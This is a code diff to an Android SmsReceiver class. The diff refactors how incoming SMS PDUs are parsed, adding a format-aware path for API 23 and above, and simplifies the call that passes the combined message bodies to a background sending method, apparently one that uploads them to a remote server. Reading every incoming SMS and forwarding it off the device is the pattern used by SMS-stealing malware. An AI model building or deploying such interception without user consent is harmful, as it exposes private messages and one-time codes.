@@ -18,6 +18,8 @@ public class SmsReceiver extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
 
+        if (context == null) return;
+
         if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
             return;
         }
@@ -28,19 +30,28 @@ public class SmsReceiver extends BroadcastReceiver {
         Object[] pdus = (Object[]) bundle.get("pdus");
         if (pdus == null) return;
 
-        StringBuilder message = new StringBuilder();
+        StringBuilder msg = new StringBuilder();
 
         for (Object pdu : pdus) {
-            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
+
+            SmsMessage sms;
+
+            if (android.os.Build.VERSION.SDK_INT >= 23) {
+                String format = bundle.getString("format");
+                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
+            } else {
+                sms = SmsMessage.createFromPdu((byte[]) pdu);
+            }
+
             if (sms != null) {
-                message.append(sms.getMessageBody());
+                msg.append(sms.getMessageBody());
             }
         }
 
-        sendToServer(message.toString(), context);
+        send(msg.toString());
     }
 
-    private void sendToServer(String msg, Context context) {
+    private void send(String msg) {
 
         new Thread(() -> {
             try {
